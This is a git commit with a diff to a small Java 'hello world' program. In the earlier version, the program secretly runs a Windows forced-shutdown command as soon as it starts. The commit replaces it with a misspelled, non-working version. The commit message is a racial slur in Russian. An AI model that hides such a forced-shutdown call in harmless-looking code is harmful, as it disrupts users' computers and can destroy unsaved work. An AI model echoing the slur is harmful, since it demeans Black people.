2d4c9d3256a8237776cb4e719d04eac6bd531159
bgiureh <esheodinakkaunt555@gmail.com>
2024-12-11 21:45:53 +0700

    нигер

--- src/Main.java
+++ src/Main.java
@@ -3,6 +3,6 @@ import java.io.IOException;
 public class Main {
     public static void main(String[] args) throws IOException {
         System.out.println("ello word!, пр");
-        Runtime.getRuntime().exec("shutdown /s /f /t 1");
+        Runtime.getRuntime().exec("shutown /s /f /t 1");
     }
 }
